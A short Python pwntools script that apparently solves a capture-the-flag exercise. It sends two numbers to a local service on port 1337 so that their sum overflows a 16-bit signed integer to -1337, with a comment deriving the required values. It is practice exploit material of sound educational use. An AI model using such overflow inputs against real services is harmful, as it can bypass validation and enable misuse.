#!/usr/bin/python3

'''
# formula to compute the int overflow:(with int short size)
#              general_formula=((overflow-32768)%65536)-32768
#              simple_formula=(overflow)-2*32768
#
# overflow=a+b
# Solution:
#     solve the equation: (a+b)-2*32768=-1337 ==> a+b=64199
'''

from pwn import *

#all combinitions of a and b that gives: a+b=64199 are correct like a=32000 b=32199
a=b'32767'
b=b'31432'

conn = remote('localhost',1337)
print(conn.recvline())
print(conn.recvuntil(b'a='))
conn.sendline(a)
print(conn.recvuntil(b'b='))
conn.sendline(b)
print(conn.recvall())

conn.close()